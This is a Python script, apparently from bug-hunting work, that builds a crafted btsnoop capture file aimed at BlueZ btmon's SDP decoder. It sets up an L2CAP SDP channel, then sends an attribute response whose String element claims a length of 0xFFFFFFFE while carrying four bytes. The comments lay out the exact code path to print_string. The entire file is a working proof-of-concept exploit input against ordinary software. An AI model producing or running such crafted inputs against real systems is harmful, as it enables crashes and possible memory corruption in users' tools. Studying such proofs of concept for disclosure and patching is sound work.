#!/usr/bin/env python3
"""
mk_btsnoop_sdp.py — build a btsnoop (HCI, format 1001) capture that drives
BlueZ btmon's SDP decoder (monitor/sdp.c) with a crafted data element.

Delivery path (the real one):
    btmon -r file.btsnoop
      -> btsnoop_read_hci (format HCI -> opcode from flags)
      -> packet_monitor -> packet_hci_acldata (ACL_RX, flags&1)
      -> l2cap_packet -> l2cap_frame -> get_psm (chan_list) == 1 (SDP)
      -> sdp_packet -> attr/search_attr -> decode_data_elements -> print_string

Packet sequence:
    1. ACL RX  L2CAP signalling / Connection Request  (PSM 1)  -> chan_add()
    2. ACL RX  L2CAP SDP data on the granted DCID             -> sdp_packet()
"""
import struct, sys

BTSNOOP_HDR = b"btsnoop\x00" + struct.pack(">II", 1, 1001)  # version 1, HCI

def acl_record(data: bytes, flags: int = 0x01) -> bytes:
    """Wrap an HCI ACL payload in a btsnoop packet record (format HCI)."""
    # btsnoop_pkt: size(4) len(4) flags(4) drops(4) ts(8) + data
    return (struct.pack(">IIIIQ", len(data), len(data), flags, 0,
                        0x00E03AB44A676000) + data)

def hci_acl(handle_flags: int, payload: bytes) -> bytes:
    """HCI ACL packet: handle|flags(2 LE) + dlen(2 LE) + payload."""
    return struct.pack("<HH", handle_flags, len(payload)) + payload

def l2cap(ci: int, payload: bytes) -> bytes:
    """L2CAP basic frame: len(2 LE) + cid(2 LE) + payload."""
    return struct.pack("<HH", len(payload), ci) + payload

def l2cap_conn_req(ident: int, psm: int, scid: int) -> bytes:
    """L2CAP signalling Connection Request (cmd 0x02)."""
    sig = struct.pack("<BBHH", 0x02, ident, 4, psm) + struct.pack("<H", scid)
    return l2cap(0x0001, sig)

def l2cap_conn_rsp(ident: int, dcid: int, scid: int) -> bytes:
    """L2CAP signalling Connection Response (cmd 0x03), result=0 success."""
    sig = struct.pack("<BBHHHHH", 0x03, ident, 8, dcid, scid, 0x0000, 0x0000)
    return l2cap(0x0001, sig)

def sdp_pdu(pdu: int, tid: int, body: bytes) -> bytes:
    """SDP PDU: pdu(1) + tid(2 BE) + plen(2 BE) + body."""
    return struct.pack(">BHH", pdu, tid, len(body)) + body

def main(datalen: int, out: str):
    SCID = 0x0040
    DCID = 0x0041
    recs = []

    # 1) OUTGOING L2CAP Connection Request for PSM 1 (SDP) -> chan_add sets .scid
    recs.append(acl_record(hci_acl(0x0001, l2cap_conn_req(0x01, 0x0001, SCID)),
                           flags=0x00))
    # 2) incoming connection response completing the channel
    recs.append(acl_record(hci_acl(0x0001, l2cap_conn_rsp(0x01, DCID, SCID)),
                           flags=0x01))

    # 3) SDP Service Search Attribute Response (pdu 0x07) carrying one
    #    attribute-list; body = attribute list data elements.
    #    AttributeList: SEQ8 (all we need is a String element for print_string)
    #    The decoder walks decode_data_elements over the attribute bytes.
    #    Craft: type=String(4) size-idx=7 (32-bit len) = 0x27 ; len ; payload
    string_elem = bytes([0x27]) + struct.pack(">I", datalen) + b"ABCD"
    # wrap in an AttributeList sequence: SEQ8 (0x35) len then elements
    attr_list = bytes([0x35, len(string_elem)]) + string_elem
    # AttributeListByteCount (BE) must equal len(attr_list); then a 0x00
    # continuation-state byte so handle_continuation() takes the decode path.
    body = struct.pack(">H", len(attr_list)) + attr_list + bytes([0x00])
    pdu = sdp_pdu(0x07, 0x0002, body)

    # send SDP data on the channel; for 'in' frames get_chan_data_index matches
    # chan_list[i].scid == cid, and chan_add(TX conn-req) set .scid = SCID.
    recs.append(acl_record(hci_acl(0x0001, l2cap(SCID, pdu)), flags=0x01))

    with open(out, "wb") as f:
        f.write(BTSNOOP_HDR)
        for r in recs:
            f.write(r)
    print(f"wrote {out}: {len(recs)} records, datalen=0x{datalen:08x}")

if __name__ == "__main__":
    dl = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0xFFFFFFFE
    out = sys.argv[2] if len(sys.argv) > 2 else "/home/box/BTHunt/out/sdp_capture.btsnoop"
    main(dl, out)
